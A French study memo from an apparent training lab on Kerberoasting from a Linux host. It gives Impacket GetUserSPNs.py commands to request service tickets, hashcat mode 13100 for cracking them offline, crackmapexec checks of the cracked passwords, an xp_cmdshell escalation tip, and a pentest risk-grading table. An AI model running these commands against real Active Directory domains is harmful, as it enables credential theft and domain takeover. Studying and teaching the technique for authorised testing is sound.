# Mémo — Kerberoasting depuis Linux

> Suite du [Living Off the Land](memo-living-off-the-land.md). On a repéré des comptes avec **SPN** pendant l'énum.
> **But** : mouvement latéral / élévation de privilèges. Hôte Linux non joint au domaine + creds de domaine valides.
> Domaine : `INLANEFREIGHT.LOCAL`, DC = `ACADEMY-EA-DC01` (`172.16.5.5`).

---

## 1. Principe

- **SPN** (Service Principal Name) = identifiant unique qui mappe une instance de service à un **compte de service** AD.
  Les services tournent souvent sous un **compte de domaine** (pas `NT AUTHORITY\LOCAL SERVICE`) pour pouvoir s'authentifier sur le réseau.
- **N'importe quel user du domaine** peut demander un ticket Kerberos (**TGS**) pour n'importe quel compte à SPN (même à travers un trust si l'auth est permise).
- Le **TGS-REP est chiffré avec le hash NTLM du compte de service** → on peut le cracker **offline** (Hashcat) pour récupérer le mot de passe en clair.
- Les comptes de service sont souvent **sur-privilégiés** (admin local sur plusieurs serveurs, voire **Domain Admins** direct ou par imbrication) et ont des **mots de passe faibles/réutilisés** (parfois = username).

> ⚠️ Obtenir un TGS ≠ accès garanti : il faut encore **cracker** le ticket. Les TGS sont **plus longs à cracker** que du NTLM ;
> sans mot de passe faible, ça peut être infaisable même sur un rig GPU.

**Prérequis** : creds de domaine (clear **ou** hash NTLM avec Impacket) OU shell dans le contexte d'un user de domaine OU `SYSTEM` sur un hôte joint. + connaître le **DC** à interroger.

---

## 2. Où peut se faire l'attaque

- Hôte Linux **non joint** avec creds de domaine valides (← ce mémo).
- Hôte Linux **joint** en tant que `root` (après récupération du **keytab**).
- Hôte Windows joint (user de domaine / shell dans un contexte de domaine / `SYSTEM`).
- Hôte Windows **non joint** via `runas /netonly`.

**Outils** : Impacket **`GetUserSPNs.py`** (Linux) · `setspn.exe` + PowerShell + Mimikatz · **PowerView / Rubeus** (Windows).

---

## 3. GetUserSPNs.py (Impacket)

Installation (si besoin) depuis le repo Impacket cloné :
```bash
sudo python3 -m pip install .      # installe les outils dans le PATH
GetUserSPNs.py -h
```

### a) Lister les comptes à SPN (sans ticket)
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
- Prompt de mot de passe → sortie formatée : `ServicePrincipalName`, `Name`, **`MemberOf`**, `PasswordLastSet`, `Delegation`.
- 👀 **Toujours regarder `MemberOf`** : repérer les comptes membres de **Domain Admins** / groupes privilégiés → un crack = potentiel domain compromise.

### b) Demander tous les TGS (offline cracking)
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
→ sort les tickets au format `$krb5tgs$23$*...` prêts pour Hashcat/John.

### c) Cibler un seul compte + écrire dans un fichier
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
- `-request-user <compte>` = un seul TGS (plus discret / ciblé).
- `-outputfile <fichier>` = sauvegarde le ticket → à envoyer sur un rig GPU.
- Auth possible aussi par **hash** (`-hashes LMHASH:NTHASH`), **no-pass** (`-no-pass`), ou **ticket Kerberos** (`-k`).

---

## 4. Cracking offline (Hashcat)

Mode **`13100`** = Kerberos 5 TGS-REP (etype 23 / RC4).
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
→ Status `Cracked`, le mdp apparaît en fin de ligne (ex. `...:database!`).

---

## 5. Valider l'accès

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p 'database!'
```
→ `(Pwn3d!)` = admin sur la cible. Si le compte est **Domain Admin**, on peut s'authentifier sur le DC → domain compromise, puis post-exploit.

> 💡 Même un TGS cracké d'un compte **peu privilégié** reste utile : on peut forger un ticket de service pour le SPN visé
> (ex. `MSSQL/SRV01` → accès `sysadmin`, activer `xp_cmdshell` → exécution de code sur le serveur SQL).

---

## 6. Reporting (gradation du risque)

| Situation | Risque à reporter |
|-----------|-------------------|
| TGS cracké → Domain Admin / chemin vers compromission | **High** |
| TGS crackés mais aucun compte privilégié | High (selon accès obtenu) |
| Impossible de cracker un seul TGS (mdp forts) | **Medium** — signaler le risque des SPN (mdp peut être affaibli / attaquant déterminé + GPU) tout en notant le contrôle mitigeant |

> Savoir **baisser** le risque d'un finding quand un contrôle mitigeant (mdp très forts) est en place est essentiel dans un rapport honnête.

---

## 7. À retenir

| Besoin | Commande |
|--------|----------|
| Lister les comptes à SPN | `GetUserSPNs.py -dc-ip <DC> <DOM>/<user>` |
| Récupérer tous les TGS | `GetUserSPNs.py ... -request` |
| Cibler un compte + fichier | `GetUserSPNs.py ... -request-user <u> -outputfile <f>` |
| Auth par hash | `-hashes LMHASH:NTHASH` |
| Cracker le TGS | `hashcat -m 13100 <fichier> rockyou.txt` |
| Valider l'accès | `crackmapexec smb <DC> -u <u> -p <pass>` → `(Pwn3d!)` |
| Toujours vérifier | `MemberOf` dans la sortie (Domain Admins = jackpot) |
